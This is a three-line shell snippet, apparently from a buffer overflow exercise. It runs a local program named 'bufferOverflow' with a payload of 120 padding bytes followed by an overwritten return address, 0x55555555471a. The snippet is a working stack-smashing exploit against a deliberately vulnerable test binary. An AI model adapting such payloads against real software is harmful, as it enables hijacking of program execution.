# Address to jump to 0x55555555471a
# with padding of 120 As
./bufferOverflow $(python -c 'print "A"*120 + "\x1a\x47\x55\x55\x55\x55"')
